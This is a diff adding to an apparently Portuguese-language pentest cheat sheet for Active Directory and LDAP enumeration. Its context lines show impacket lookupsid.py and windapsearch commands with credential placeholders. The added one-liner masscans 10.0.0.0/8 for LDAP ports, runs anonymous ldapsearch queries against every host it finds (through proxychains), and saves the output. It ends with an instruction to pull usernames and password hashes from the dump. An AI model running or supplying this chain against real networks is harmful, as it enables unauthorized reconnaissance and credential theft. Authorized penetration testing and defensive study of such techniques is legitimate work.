@@ -11,3 +11,6 @@ python /usr/share/doc/python3-impacket/examples/lookupsid.py <username>:<passwor
 
 # Windapsearch https://github.com/ropnop/windapsearch 
 python3 windapsearch.py -d <dominio> -u <dominio>\\<ldapbind> -p <password> -U
+
+# ldap-recon, masscan, ldapsearch
+sudo masscan -p389,636 --interface <interface> --adapter-ip <IP> 10.0.0.0/8 -oX ldap.xml -oL ldap.txt && cat ldap.txt | cut -d" " -f4 | sort -u > 389.txt && for i in $(cat 389.txt); do echo $i >> all-636.txt; dc=$(ldapsearch -h $i -p 389 -x -s base '' "(objectClass=*)"  "*" + | grep namingContexts | grep -i dc | egrep -v 'Schema|ForestDnsZones|Configuration|DomainDnsZones' | cut -d " " -f2 | cut -d, -f1) ; echo ldapsearch -h $i -p 636 -x -b "$dc,dc=<dc>" >> all-636.txt ; echo $i ; echo $dc ;  proxychains ldapsearch -h $i -p 389 -x -b "$dc,dc=<dc>" >> all-389.txt ; done && echo "\nABRA O ARQUIVO ALL-389.TXT E SEPARE USUARIO E HASH"
